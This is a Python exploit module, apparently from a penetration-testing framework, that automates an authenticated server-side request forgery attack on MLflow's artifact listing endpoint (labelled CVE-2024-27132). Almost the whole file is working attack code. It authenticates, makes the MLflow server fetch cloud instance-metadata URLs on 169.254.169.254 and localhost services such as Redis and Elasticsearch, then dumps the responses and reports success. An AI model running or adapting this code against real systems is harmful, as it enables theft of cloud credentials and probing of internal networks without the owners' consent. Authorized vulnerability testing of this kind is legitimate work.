from typing import ClassVar

from requests import get

from flowhound.vulnerabilities.auxiliary.base_auxiliary_class import AuxiliaryBaseClass
from flowhound.vulnerabilities.clients.mlflow import MLflowClient


class Auxiliary(AuxiliaryBaseClass):
    """
    CVE-2024-27132 — Authenticated SSRF via the MLflow artifact listing endpoint.

    The ``GET /api/2.0/mlflow/artifacts/list`` endpoint accepts an ``artifact_uri``
    query parameter and unconditionally makes a server-side HTTP request to that
    URI to resolve artifact metadata.  An authenticated attacker can supply an
    arbitrary URL (e.g. an internal cloud-metadata endpoint or intranet service),
    causing the MLflow server to issue outbound requests on the attacker's behalf.

    This allows:
    * Internal network reconnaissance
    * Cloud IMDS credential theft (AWS ``169.254.169.254``, GCP/Azure equivalents)
    * Access to internal HTTP services not reachable from outside the network

    Affected versions: MLflow < 2.11.3
    Fixed in: 2.11.3
    CVSS: 8.8 (High)
    """

    _client_class = MLflowClient

    # Ordered from most to least commonly exposed; first hit wins.
    _DEFAULT_SSRF_TARGETS: ClassVar[list[str]] = [
        # AWS / GCP / Azure cloud metadata services
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/computeMetadata/v1/?recursive=true",
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        # Common internal services
        "http://127.0.0.1:80/",
        "http://127.0.0.1:8080/",
        "http://127.0.0.1:9200/",  # Elasticsearch
        "http://127.0.0.1:6379/",  # Redis
    ]

    def trigger_vuln(
        self,
        base_url: str,
        headers: dict[str, str],
        artifact_uri: str,
        proxies: dict[str, str] | None = None,
    ) -> tuple[int, str] | None:
        """
        Send the SSRF probe to the artifacts/list endpoint.

        Returns (status_code, body) or None on network error.  A non-error HTTP
        response from the MLflow server confirms the server issued an outbound
        request, even when the artifact_uri itself returns an error or the MLflow
        response body is empty — the server-side connection attempt is the signal.
        """
        endpoint = "/api/2.0/mlflow/artifacts/list"
        params = {"artifact_uri": artifact_uri}

        try:
            resp = get(
                base_url + endpoint,
                headers=headers,
                params=params,
                timeout=self.TIMEOUT,
                proxies=proxies,
            )
        except Exception as e:  # noqa: BLE001
            self.logger.warning(f"Network error sending SSRF probe: {e!s}")
            return None

        return resp.status_code, resp.text

    def run(
        self,
        base_url: str,
        f_path: str | None = None,
        username: str = "",
        password: str = "",
        proxies: dict[str, str] | None = None,
    ) -> bool:
        self.logger.info(
            f"Authenticating as {username!r} for CVE-2024-27132 (authenticated SSRF)..."
        )
        headers = self.handle_authentication(
            base_url=base_url,
            username=username,
            password=password,
            proxies=proxies,
        )

        if headers is None:
            return False

        targets = [f_path] if f_path else self._DEFAULT_SSRF_TARGETS

        for target in targets:
            self.logger.info(f"Sending SSRF probe to: {target!r}")
            result = self.trigger_vuln(
                base_url=base_url,
                headers=headers,
                artifact_uri=target,
                proxies=proxies,
            )

            if result is None:
                continue

            status, body = result
            # A 200 from the MLflow server means the server forwarded the request
            # and returned a result — the SSRF succeeded.
            # A 400/500 that includes the target URL or connection-refused text
            # may also confirm that the server *attempted* the outbound request.
            if status == 200:
                self.logger.info(
                    f"Attack successful! MLflow issued an SSRF request to {target!r}."
                )
                self.logger.info(f"Response body ({len(body)} bytes):\n{body[:2048]}")
                return True

            if status in (400, 500) and target in body:
                self.logger.info(
                    f"Attack successful (error response confirms server-side request was made).\n"
                    f"SSRF target: {target!r}\nMLflow response: {body[:512]}"
                )
                return True

        self.logger.warning(
            "CVE-2024-27132: no SSRF targets responded — target may be patched "
            "or internal services are unreachable from this network."
        )
        return False
